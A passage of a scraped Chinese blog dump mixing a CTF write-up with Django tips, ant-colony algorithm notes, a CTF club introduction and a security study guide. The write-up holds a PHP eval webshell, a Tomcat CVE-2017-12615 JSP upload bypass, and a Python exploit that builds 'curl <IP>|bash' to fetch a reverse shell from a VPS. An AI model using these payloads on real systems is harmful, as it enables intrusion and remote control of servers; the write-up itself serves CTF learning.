&#x27;technically, this cannot happen&#x27;;&#125; $p-&gt;startBuffering();$p[&#x27;file1.txt&#x27;] = &#x27;file1&#x27;;$p[&#x27;file2.txt&#x27;] = &#x27;file2&#x27;;$p[&#x27;file3.txt&#x27;] = &#x27;file3&#x27;;$p[&#x27;shell.php&#x27;] = &#x27;&lt;?php eval($_POST[\\&#x27;x\\&#x27;]); ?&gt;&#x27;; // use my.pharecho file_get_contents(&#x27;phar://my.phar/file2.txt&#x27;); // echo file2 // make a file named my.phar$p-&gt;setStub(&quot;&lt;?php Phar::mapPhar(&#x27;myphar.phar&#x27;); __HALT_COMPILER();&quot;); $p-&gt;stopBuffering(); ?&gt; 0x06 成绩单打开题目后输入1，单引号无回显，双引号正常，如下二图所示。 可以明显知道为盲注，用sqlmap爆库报表报字段，报字段比较久，因为是基于时间的盲注，即可得到flag。 0x07 小猫咪踩灯泡题目给的提示是：CVE-2017-12615，查一下这个漏洞，其原理：是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。 目前主要三种绕过方法： evil.jsp/ evil.jsp%20 evil.jsp::$DATA 所以构造出如下的put请求，上传jsp文件的请求内容如下： 1234567891011121314PUT /evil.jsp/ HTTP/1.1 Host: 79c6287a.yunyansec.com User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Modified-Since: Thu, 20 Jun 2019 10:03:08 GMT If-None-Match: W/&quot;5619-1561024988000&quot; Cache-Control: max-age=0 Content-Length: 6275 菜刀链接的JSP代码复制到这里 菜刀连一下便可。 0x09 分析代码获得flag人生中第一个一血，开心 2333 打开题目，查看源码，发现是限制长度小于7的命令执行，马上想到Hitcon 2017 BabyFirst_Revenge，可参考这里（https://xz.aliyun.com/t/1579）。 其原理是利用 linux &gt; 重定向可以直接用来写文件，直接实操一遍PoC里的内容就清楚了。首先我们需要控制命令序列的先后顺序，即文件创建的先后（例如我们应该让curl vpsip|bash顺序是可控的），我们可以用ls -t 来根据文件创建时间先后来排序进而达到此目的，如下图所示。 然后写入我们需要执行的命令，如下图所示。 先执行 sh _ ，即 ls -t &gt;g，就是把上图的命令写入g文件中，如下图所示。 是乱的是因为不同文件比新写入了，如g文件，但是我们关心的是g文件，里面顺序是正常的就可以构造我们的命令。如下图所示。 最后我们执行 sh g就可以执行我们想要的命令了。 Hitcon2017的长度限制是5，可以直接用。拿出刷题的payload直接打就可以反弹shell了。在服务器网站根目录准备好反弹shell的命令，然后nc -lvvp 8080监听一下端口，本地执行一下Python脚本，题目机器去请求我的VPS，然后执行反弹shell命令，最后shell反弹至我VPS 8080端口上，flag在/var/www/key里，如下图所示。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940import requestsfrom time import sleepfrom urllib.parse import quotepayload = [ # generate `ls -t&gt;g` file # `ls` sort is relative to variable environment LC_COLLATE &#x27;&gt;ls\\\\&#x27;, &#x27;ls&gt;_&#x27;, &#x27;&gt;\\ \\\\&#x27;, &#x27;&gt;-t\\\\&#x27;, &#x27;&gt;\\&gt;g&#x27;, &#x27;ls&gt;&gt;_&#x27;, # generate `curl 116.62.37.26|bash` # take a care about &gt;number. , we should let number be first &#x27;&gt;sh&#x27;, &#x27;&gt;ba\\\\&#x27;, &#x27;&gt;\\|\\\\&#x27;, &#x27;&gt;26\\\\&#x27;, &#x27;&gt;7.\\\\&#x27;, &#x27;&gt;3\\\\&#x27;, &#x27;&gt;2.\\\\&#x27;, &#x27;&gt;6\\\\&#x27;, &#x27;&gt;6.\\\\&#x27;, &#x27;&gt;11\\\\&#x27;, &#x27;&gt;\\ \\\\&#x27;, &#x27;&gt;rl\\\\&#x27;, &#x27;&gt;cu\\\\&#x27;, # exec &#x27;sh _&#x27;, &#x27;sh g&#x27;, ]for i in payload: assert len(i) &lt;= 5 r = requests.get(&#x27;http://3dac2ab9.yunyansec.com/?1=&#x27; + quote(i) ) print(i) sleep(0.2) END还有两个SQL注入不太会，有空得把sqli-lab先全刷了入个门2333","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"django踩坑记","slug":"2020/django踩坑记","date":"2020-01-02T00:50:23.000Z","updated":"2021-04-02T02:16:10.324Z","comments":true,"path":"/p/2020/django踩坑记/","link":"","permalink":"https://tari.moe/p/2020/django%E8%B8%A9%E5%9D%91%E8%AE%B0/","excerpt":"","text":"python 虚拟环境pip install virtualenvpip install virtualenvwrapper-win # windows 使用此命令 好处,：可以一个环境对应一个项目 闭包一直好奇闭包有什么用，直到学了 django 后的登录装饰器 闭包的应用：装饰器、面向对象 1234567891011121314151617181920&quot;&quot;&quot;装饰器的应用如果需要统计一个函数运行的时间，加上装饰器即可，可简化代码&quot;&quot;&quot; import timedef func_timer(func): def wrapper(): start_time = time.time() func() print(time.time() - start_time) return wrapper@func_timerdef login(): print(&#x27;login success!&#x27;)login() 跨域问题在与 setting.py 同级目录新建一个 py 文件。写入如下代码 123456789from django.utils.deprecation import MiddlewareMixinclass SolveCrossDomainMiddleware(MiddlewareMixin): def process_response(self, request, response): response[&quot;Access-Control-Allow-Credentials&quot;] = &quot;true&quot; response[&quot;Access-Control-Allow-Origin&quot;] = &quot;http://192.168.123.60:8080&quot; response[&quot;Access-Control-Allow-Methods&quot;] = [&quot;GET&quot;, &quot;POST&quot;] return response 如下图所示 在 settingpy 的 MIDDLEWARE 引入， webproject 与自己的项目名字对应， 1&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;, 如下图所示 即可解决跨域问题，因为 SolveCrossDomainMiddleware 中已经对 request 和 response 做了处理了 session 跨域问题因为我使用的是 Vue.js + django 前后端分离，因此需要解决 session 跨域问题 Vue 里加入 (因为我使用的是 axios1this.$axios.defaults.withCredentials = true 如下图所示 以下为 django 里的操作我使用的是 数据库存储 session， 因此 setting.py 引入的是 123456789101112131415161718MIDDLEWARE = [...&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,...]SESSION_ENGINE = &#x27;django.contrib.sessions.backends.db&#x27; # 引擎（默认）SESSION_COOKIE_NAME = &quot;sessionid&quot; # Session的cookie保存在浏览器上时的key，即：sessionid＝随机字符串（默认）SESSION_COOKIE_PATH = &quot;/&quot; # Session的cookie保存的路径（默认）SESSION_COOKIE_DOMAIN = None # Session的cookie保存的域名（默认）SESSION_COOKIE_SECURE = False # 是否Https传输cookie（默认）SESSION_COOKIE_HTTPONLY = True # 是否Session的cookie只支持http传输（默认）SESSION_COOKIE_AGE = 3600 # Session的cookie失效日期（默认2周）SESSION_EXPIRE_AT_BROWSER_CLOSE = False # 是否关闭浏览器使得Session过期（默认）SESSION_SAVE_EVERY_REQUEST = False # 是否每次请求都保存Session，默认修改之后才保存（默认）# !!! 这个一定要加.....SESSION_COOKIE_SAMESITE = None # 默认为 Lax, 即 get 可跨域, 而 post 不可以 如下图红线区所示 在 Vue.js 前端引入 migrate 无报错，迁移后数据库没有增加表我是手动直接删除了 migrations 里面的文件和数据库里面的表格，，然后我改了 models.py 后 makemigrations &amp;&amp; migrate 数据库竟然没有多出表。 原来 django 数据库里面，是有这个表格的 里面存放着关于数据库迁移的信息，所以我手动删除了迁移表和数据后并没有什么乱用，数据库以为它还是在的，，所以，我选择了删除所以表格，，重新 makemigrations &amp;&amp; migrate 就好了。 因为这是个人作业，，所以随便删了，生产环境慎用。。。**","categories":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"开发/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"开发/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"}]},{"title":"计算智能实验","slug":"2019/计算智能实验","date":"2019-12-04T07:17:08.000Z","updated":"2021-06-09T00:33:57.449Z","comments":true,"path":"/p/2019/计算智能实验/","link":"","permalink":"https://tari.moe/p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/","excerpt":"","text":":) 蚁群算法AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离) AS 中的随机比例规则(random proportional): 对于每只蚂蚁 k, 路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号 $ \\tau_{o}(i, j) = \\frac{m}{C^{nn}} $, m是蚂蚁个数, $C^{nn}$ 是由贪婪算法构造的路径的长度 设蚂蚁 k 当前所在城市为 i, 则其选择城市 j 作为下一个访问对象的概率为: $$p_{k}(i,j) = \\begin{cases}\\frac{[\\tau(i, j) ]^{\\alpha} [\\eta(i, j)^{\\beta } ]}{\\sum_{u \\in J_{k}(i) }[\\tau(i, u) ]^{\\alpha} [\\eta(i, u)^{\\beta } ]} &amp; \\text , ; j \\in J_{k}(i) \\;;;;;;;;;;;; 0 &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合 $\\eta(i, j)$ 是一个启发式信息, 通常由 $\\eta(i, j) = \\frac{1}{d_{ij}}$ 直接计算 $\\tau(i, j)$ 表示边 (i, j) 上的信息素量 $\\alpha$ 和 $\\beta $ 是两个预先设置的参数, 实验表明 $\\alpha$ = 1, $\\beta $ = 2 ~ 5 比较合适 城市 i 与 城市 j 的相连边上的信息素量 $\\tau_(i, j)$ 按如下公式进行更新: $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\sum_{ k=1 }^{m} \\Delta \\tau_{k}(i, j)\\\\Delta \\tau_{k}(i, j) = \\begin{cases}(C_{k})^{-1} &amp; , ; (i, j) \\in R^{k} \\0 &amp; ,; other\\end{cases}$$ m 是蚂蚁个数 $\\rho$ 是信息素的蒸发率, 规定 $0 &lt; \\rho \\leqslant 1 $ , $\\rho$ 通常设置为 = 0.5 $\\Delta \\tau_{k}(i, j)$ 是第 k 只蚂蚁在它经过的边上释放的信息素量(没放过当然就取 0 啦！), 它等于蚂蚁 k 本轮构建路径长度的倒数 $C_{k}$ 表示路径长度, 它是 $R^{k}$ 中所有边的长度和 ACS 与 AS 的不同的三个方面参数一览####状态转移规则， ACS中的伪随机比例规则(pseudorandom proportional): 对于每只蚂蚁 k, 路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号 设蚂蚁 k 当前所在城市为 i, 则下一个访问城市: $$j = \\begin{cases}arg ; max_{j \\in J_{k}(i)} {[\\tau(i, j) ], [\\eta(i, j)^{\\beta }]} &amp; \\text , ; q \\leqslant q_{0} \\S &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合 $\\eta(i, j)$ 是一个启发式信息, 通常由 $\\eta(i, j) = \\frac{1}{d_{ij}}$ 直接计算 $\\tau(i, j)$ 表示边 (i, j) 上的信息素量 $\\beta$ 是描述信息素浓度和路径长度信息相对重要性的控制参数 $q_{0}$ 是一个 [0, 1] 区间内的参数, 当产生的随机数 $q \\leqslant q_{0}$ 时, 蚂蚁直接选择使启发式信息与信息素量的 $\\beta$ 指数乘积最大的下一城市节点, 我们通常称之为开发(exploitation); 反之, 当产生的随机数 $q &gt; q_{0}$ 时, ACS将和各种AS算法一样使用轮盘赌选择策略, 即偏向探索(biased exploration) 信息素全局更新规则 不论是信息素的蒸发还是释放, 都只在属于至今最优路径的边上进行 $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\rho \\cdot \\Delta \\tau_{b}(i, j) , \\forall (i, j) \\in T_{b}$$ $\\Delta \\tau_{b}(i, j) = \\frac{1}{C_{b}}$ 参数 $\\rho$ 代表信息素蒸发的速率, 新增加的信息素 $\\Delta \\tau_{b}(i, j)$ 被乘上系数 $\\rho$ 后, 更新后的信息素浓度被控制在旧信息素量与新释放的信息素量之间, 用一种隐含的又更简单的方式实现了 MMAS 算法中对信息素量取值范围的限制 信息素局部更新规则$$\\tau(i, j) = (1 - \\xi) \\cdot \\tau(i, j) + \\xi \\cdot \\tau_{0}$$ $\\xi$ 是信息素局部挥发速率, 满足 $0 &lt; \\xi &lt; 1$, 通过实验发现 $\\xi = 0.1$ $\\tau_{0}$ 是信息素的初始值, 取值为 $\\frac{1}{nC^{nn}}$ 时, 对大多数实例有着非常好的性能. 其中 n 为城市个数, $C^{nn}$ 是由贪婪算法构造的路径的长度","categories":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[]},{"title":"记录一些杂乱的东西","slug":"2019/乱七八糟","date":"2019-11-18T06:26:32.000Z","updated":"2022-02-01T04:24:44.938Z","comments":true,"path":"/p/2019/乱七八糟/","link":"","permalink":"https://tari.moe/p/2019/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/","excerpt":"","text":"能量是标量这句话意味深远呀 ～一群人纠结了一天这个题目的结果是标量还是矢量，23333 二进制的魅力~老久之前一直想记下来, 一直忘了… 12345678910111213141516import timenum_need_validate = 123423cnt = 10**7a = 0 time_start1 = time.time()for i in range(cnt): if (num_need_validate % 2) != 0: a = a + 1# 平均在这个数字 2.133270025253296print(time.time() - time_start1) 123456789101112131415161718import mathimport timenum_need_validate = 123423cnt = 10**7a = 0time_start2 = time.time()for i in range(cnt): if (num_need_validate &amp; 0) : a = a + 1 # 平均在这个数字 0.8398542404174805print(time.time() - time_start2) linux 趣事一直很好奇 vim 的 hjkl 方向键 以及 ~ 为什么是根目录…https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"佛大2019红帽杯相关咨询","slug":"2019/2019hmb","date":"2019-10-17T16:09:54.000Z","updated":"2021-06-09T02:08:30.645Z","comments":true,"path":"/p/2019/2019hmb/","link":"","permalink":"https://tari.moe/p/2019/2019hmb/","excerpt":"","text":"1.什么是CTFCTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 2.什么是红帽杯红帽杯是由广东省计算机信息网络安全协会将于2019年11月在广州举办第三届红帽杯网络安全攻防（CTF）大赛。 报名时间10月10日00:00 - 11月07日24:00 初赛时间11月10日09:00 - 11月11日09:00 报名官方网站 https://www.cinsa.org.cn/2019redhat 欢迎咨询佛大信息安全协会 微信号： 范同学：fjw712452 刘同学：Glan5812 徐同学：Gtari720 3.入门CTF，你需要什么 快速学习新事物的能力 一个不一样的思考方式 一颗乐于解决问题的心 一些有趣的网络安全技术 一段充实奋斗的时光 在这里，我们希望能给予你一些建议： 善用 Google 搜索可以帮助你更好地提升自己 掌握至少一门编程语言，比如 Python 实践比什么都要管用 保持对技术的好奇与渴望并坚持下去 4.CTF是怎么比赛的由于 CTF 的考题范围其实比较宽广，目前也没有太明确的规定界限说会考哪些内容。但是就目前的比赛题型而言的话，主要还是依据常见的 Web 网络攻防、RE 逆向工程、Pwn 二进制漏洞利用、Crypto 密码攻击、Mobile 移动安全 以及 Misc 安全杂项 来进行分类。 Web - 网络攻防主要为 Web 安全中常见的漏洞，如 SQL 注入、XSS、CSRF、文件包含、文件上传、代码审计、PHP 弱类型等，Web 安全中常见的题型及解题思路，并提供了一些常用的工具。 Reverse Engineering - 逆向工程主要为逆向工程中的常见题型、工具平台、解题思路，进阶部分介绍了逆向工程中常见的软件保护、反编译、反调试、加壳脱壳技术。 Pwn - 二进制漏洞利用Pwn 题目主要考察二进制漏洞的发掘和利用，需要对计算机操作系统底层有一定的了解。在 CTF 竞赛中，PWN 题目主要出现在 Linux 平台上。 Crypto - 密码攻击主要包括古典密码学和现代密码学两部分内容，古典密码学趣味性强，种类繁多，现代密码学安全性高，对算法理解的要求较高。 Mobile - 移动安全主要为安卓逆向中的常用工具和主要问题类型，安卓逆向常常需要一定的安卓开发知识，iOS 逆向题目在 CTF 竞赛中较少出现，因此不作过多介绍。 Misc - 安全杂项以诸葛建伟翻译的《线上幽灵：世界头号黑客米特尼克自传》和一些典型 MISC 题为切入点，内容主要包括信息搜集、编码分析、取证分析、隐写分析等。 5.CTF方向那么多，我选择那一条呢 这需要你自己选择一个适合的方向，下面是各个方向的介绍。 A方向：PWN+Reverse+Crypto随机搭配 IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等 B方向：Web+Misc 网络安全、内网渗透、数据库安全等 公共部分：Linux基础、计算机组成原理、操作系统原理、网络协议分析 这是简单的介绍，去选择一条属于自己的路吧！ PWN、Reverse偏重对汇编、逆向的理解 Crypto偏重对数学、算法的深入学习 Web偏重对技巧沉淀、快速搜索能力的挑战 Misc比较复杂，所有与计算机安全挑战有关的都算在其中 6.我选好了路，但是怎么去学习呢下面推荐几本书： A方向：IDA pro权威指南（重要）揭秘家庭路由器0day漏洞挖掘技术RE for Beginners（逆向工程入门）自己动手写操作系统黑客攻防技术宝典：系统实战篇 B方向：Web应用安全权威指南（适合小白入门对WEB安全进行宏观的理解）黑客攻防技术宝典 Web实战篇Web前端黑客技术揭秘黑客秘籍-渗透测试实用指南代码审计：企业级Web代码安全架构 7.web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！8.总结CTF可能门槛比较高，但是入门之后你会发现其乐趣 在学习过程中遇到挫折不要轻易放弃，建议先谷歌查找相关资料，实在查不到再求助他人。 关于如何提问，建议阅读这篇文章：提问的智慧 有任何问题欢迎到群里或联系协会成员。 补充 Q1: 要是我技术不好或者基础不太好怎么办？你们会教吗？ A1: 不用担心，我们会根据你们大部分人的基础，给予你们相关资料和多次线下培训。不用担心自己什么都不会，一开始谁都是小白，本次红帽杯参赛匆忙怕取得不了好成绩的，也可以为12月份百度杯，明年1月份安恒杯做准备喔！ Q2： 教练，我迫不及待想看看ctf大概是怎样的 A2： 这个是中科大的新生ctf赛。相对会简单些的。如果有迫不及待想了解ctf是怎样的同学可以注册个账号玩玩，不懂的可以百度或者群上问喔！ https://hack.lug.ustc.edu.cn/ 2019 年度中国科学技术大学第六届信息安全竞赛即将开幕，科大信息安全大赛自 2014 年起已经连续举办五届，往届比赛均顺利举行，规模盛大，影响甚广。 赛制：个人线上比赛，解题模式，约 25 道题目； 比赛题目分为 4 类，分类如下：综合技能（general）、程序逆向与漏洞利用（binary）、密码学与数学（math）、网站安全（web）","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"}]},{"title":"佛大2019红帽杯入门指导","slug":"2019/2019hmb_guide","date":"2019-10-17T06:09:50.000Z","updated":"2021-06-09T02:08:33.365Z","comments":true,"path":"/p/2019/2019hmb_guide/","link":"","permalink":"https://tari.moe/p/2019/2019hmb_guide/","excerpt":"","text":"Web入门传送门Re 逆向 入门传送门PWN 二进制 入门传送门Crypto 密码学 入门传送门Misc 杂项 入门传送门 萌新入门刷题传送门 1.web的详细入门指导首先，大略过一下最基础的语言语法HTML／CSS、JavaScript、PHP、SQL的基本知识（平均一个语言4小时足矣），要做到看到这些代码的时候不会畏惧，能看懂大部分，看到不懂的能通过google或者相关文档查懂。主要参考：http://www.w3school.com.cn/ 、http://www.runoob.com/ , 这里不要求学很深，很浅很浅就行，后面边学边用掌握的会更快。 现在，你初步了解了一些语言知识，接下来你就需要开始在实践中学习与巩固。 当然就是实践了。这里，我建议你搭建一个个人的博客，初步了解这些语言的应用。在搭建博客的过程中，你需要学习对应的linux操作、Apache+PHP+Mysql环境的配置、域名解析、服务器端口配置等等。如何搭建博客，请自行google搜索。此外，你也可以编写一些好玩的网页来学习这些知识点。 如果你能完成如上所说的这些，尤其是第三点，那么恭喜你，你入门了，其实这些前期会遇到很多语言方面难免会遇到挫折，但是没关系，多百度多谷歌，多群里提问，我们都会及时给你解答。 接下来可以了解基本的HTTP协议相关知识 掌握HTTP请求：GET、POST、HEAD，能基本读懂一个HTTP数据包，了解GET、POST、HEAD的区别 能看懂HTTP响应包 404 403 200 500 302 301 … 了解Cookie、session、token，知道是什么东西，作用是什么，为什么需要这些东西 了解Referer、X-Forwarded-For等等的作用 学漏洞知识点之前，如果你了解了如上所说的一些东西，那么就可以学习下面的知识(进阶)啦，当然能学懂上面的知识可能需要大概3周左右的时间，多坚持，多提问。 sql注入 XSS攻击 文件上传漏洞 文件包含漏洞 命令执行漏洞 。。。 推荐一些学习站点https://ctf-wiki.github.io/ctf-wiki/&gt; https://xz.aliyun.com/ https://www.anquanke.com/ https://github.com/CHYbeta/Web-Security-Learning 推荐一些题库https://cgctf.nuptsast.com/login https://www.jarvisoj.com/login 推荐一些大牛的博客https://chybeta.github.io/ https://www.jianshu.com/u/bf30f18c872c https://skysec.top/ https://lorexxar.cn/ 推荐书籍《白帽子讲web安全》 《黑客攻防技术宝典·Web实战篇》 2.Reverse的详细入门指导逆向工程，Reverse，缩写一般为Re。旨在不知晓源码的情况下对程序进行分析，获取其流程，组织，结构等。CTF中一般为注册机这种形式。 最好会C语言和汇编语言，不必系统的学习汇编，上来先一条一条查指令手册，等熟悉了再仔细学习。 需了解常见加密算法的实现，要做到快速识别，无需了解攻击过程。 如何学习逆向呢，可以看下面这基本书学习基础知识，同时打比赛刷题，以赛带练。 推荐书籍 《汇编语言》（王爽） 这本比较老了，讲的8086汇编，但是讲的很好。 《加密与解密》（第四版）（看雪论坛） 看雪出的经典书籍，名叫加密与解密实际上是讲逆向。各方各面都有讲到，很全面。 《逆向工程核心原理》 主要是windows逆向，以OD为主要工具。讲的很好，面向零基础。 下面的我没看过，不好评价。。。 《Reverse Engineering for Beginners》(电子书：https://beginners.re/)（中文版为《逆向工程权威指南》） 《Android应用安全防护和逆向分析》 《Android软件安全与逆向分析》 常用工具 IDA Pro 极其强大的反汇编/反编译/调试工具，二进制选手必须会用，优秀的二进制选手能把IDA运用到出神入化的地步。有关IDA的使用能讲好多好多。 吾爱破解论坛爱盘下载。 x64dbg Windows平台优秀的开源反汇编器及调试器，可以看作Olly dbg的升级版，基本包含OD的全部功能，且一直在更新 官网下载。 gdb Linux的调试器，没有GUI。pwn选手必须掌握的技能。也可以使用IDA的远程调试功能调试linx程序。 一般的Linux自带，没有的话apt安装。 Jeb apk反编译工具，功能强大。 jadx 开源的apk反编译工具，轻量级 其他 dnSpy，xspy，CFF explorer等各类专用工具，需要靠做题中积累。 论坛与站点 汇编语言指令学习：https://www.cnblogs.com/del/category/121079.html 这一系列文章细致的讲解了win32汇编，遇到不认识的指令可到这里查询（当然直接翻intel指令手册是最准确的） 吾爱破解：知名破解论坛，注册有限制，需要10元注册或等开放。吾爱的爱盘内有大量常用工具，以及逆向专用虚拟机，可按需学习与使用。 https://www.52pojie.cn/ 看雪论坛：知名逆向论坛 https://bbs.pediy.com/ 安全客、先知等各类安全论坛，上面有各种大佬发的文章。 3.PWN的详细入门指导pwn，及pwn to own，在黑客俚语中由own演变而来。通过逆向分析二进制程序，发现其可能存在的漏洞，并进行利用，从而达到信息泄露、权限获取等目的。 需要掌握汇编语言、基础逆向方法。 入门推荐到CTF wiki的pwn板块学习，上面有极其详细的pwn教程，各类漏洞点及利用。 CTF一般为linux环境下的pwn，要熟悉linux的使用。 IDA Pro 强大的反编译工具，有了它就能轻松审计漏洞了。 gdb为做pwn题时调试必备的工具，网上有非常多关于gdb的教程。 pwndbg——gdb插件：https://github.com/pwndbg/pwndbg pwntools为专门用来做pwn题的工具，所以要学习python与pwntools。 其余学习教程： 一步一步学ROP系列：http://wooyun.jozxing.cc/static/drops/tips-6597.html http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html http://wooyun.jozxing.cc/static/drops/papers-11390.html 堆基础学习: glibc内存管理ptmalloc源代码分析.pdf linux内核源码(建议直接看malloc free源码) 堆基础(英文blog) 推荐书籍： 《深入理解计算机系统（原书第3版）》 《程序员的自我修养—链接、装载与库》 4.Crypto的详细入门指导密码学需要较强的数学基础。ctf wiki也是入门不错的选择。 了解各种密码的实现过程，相关的攻击方法。 各种密码推荐直接到英文维基学习，讲的十分详细，一般也会有源代码。 上来学习密码学可以抄脚本，不用太关心其数学原理。等深入了解后再详细研究。 古典密码——脑洞大开的密码：链接 RSA攻击汇总：https://xz.aliyun.com/t/2446#toc-32 RSAcoppersmiths攻击：https://github.com/mimoo/RSA-and-LLL-attacks 一堆密码学的题目：https://cryptopals.com/ 推荐书籍： 《深入浅出密码学——常用加密技术原理与应用》 《密码编码学与网络安全——原理与实践（第七版》 《图解密码技术》 《应用密码学：协议、算法与C源程序》 5.Misc的详细入门指导杂项，简称Misc。杂项的内容很多很广，需要选手有较大的知识面以及快速学习新鲜事物的能力。 一般包括取证，隐写分析，编码转换，信息收集，流量分析等。有时密码学中的古典密码也被放到杂项里去。其中取证与隐写是misc最重要的一块。需要选手掌握各种花式隐写套路，需有较强的脚本功底，会用各类隐写工具。 隐写 https://www.jianshu.com/p/02fdd5edd9fc流量分析 《Wireshark网络分析就这么简单》ctf-wiki: https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/ 适合萌新刷题入门传送门 攻防世界 有萌新区 2019中科大ctf新生赛 南京邮电大学网络攻防平台 较多为简单题 picoCTF2018和2019 美国面向高中生的ctf比赛 2018中科大ctf新生赛 github存档","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"}]},{"title":"2019pico小汇总","slug":"2019/2019pico","date":"2019-10-13T04:51:51.000Z","updated":"2021-08-12T15:53:16.610Z","comments":true,"path":"/p/2019/2019pico/","link":"","permalink":"https://tari.moe/p/2019/2019pico/","excerpt":"","text":"和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。由于国庆比较忙，也没有继续在解题了，然后也忘了写记录了，emmm。下图是我们队伍的1天的解题成果。这是报了小伙伴的大腿@guoguo @回忆 过些天再补上心得，2333","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"计算智能入门作业","slug":"2019/计算智能入门","date":"2019-10-03T16:35:37.000Z","updated":"2021-06-09T00:33:53.994Z","comments":true,"path":"/p/2019/计算智能入门/","link":"","permalink":"https://tari.moe/p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/","excerpt":"","text":"老师布置的作业 描述 BP 神经网络（BPNN）的训练过程，推导 3 层 BPNN 调整网络权重和偏置量的公式。 这公式推导有点难度… :(然后网上查了许多资料，有两个收获: 神经网络在隐藏层做了什么 把天天听闻的线性代数对神经网络重要性联系在一起 隐藏层：该层可以说是神经网络的关键，相当于对数据做一次特征提取。隐藏层的意义，是把前一层的向量变成新的向量。就是坐标变换，说人话就是把数据做平移，旋转，伸缩，扭曲，让数据变得线性可分。可能这个不那么好理解，举个栗子： 下面的图左侧是原始数据，要把绿点和红点分割开，要怎么做呢？ 上面二图可以在这玩 一种做法：把左图的平面看成一块布，把它缝合成一个闭合的包包（相当于数据变换到了一个3维坐标空间），然后把有绿色点的部分撸到顶部（伸缩和扭曲），然后外围的红色点自然在另一端了，要是姿势还不够帅，就挪挪位置（平移）。这时候干脆利落的砍一刀，绿点红点就彻底区分开了。 论线性代数的重要性，联系不起来可来这里补课b站线性代数的本质 关于线性变换到3维空间 不同维度的变换是合理的 例如下面这个矩阵，它的几何意义就是将二维空间映射到三维空间上 $$ \\begin{bmatrix} 3 &amp; 1\\ 4 &amp; 1\\ 5 &amp; 9 \\end{bmatrix} $$ 因为矩阵有两列表面输入空间有两个基向量， 有三行表示每一个基向量在变换后都用三个独立的坐标来描述 所以它们一定落在三维空间中，因此这是一个从二维空间到三维空间的变换 不太理解可以看此视频 b站线性代数的本质-第四章 再如下面这个矩阵 $$ 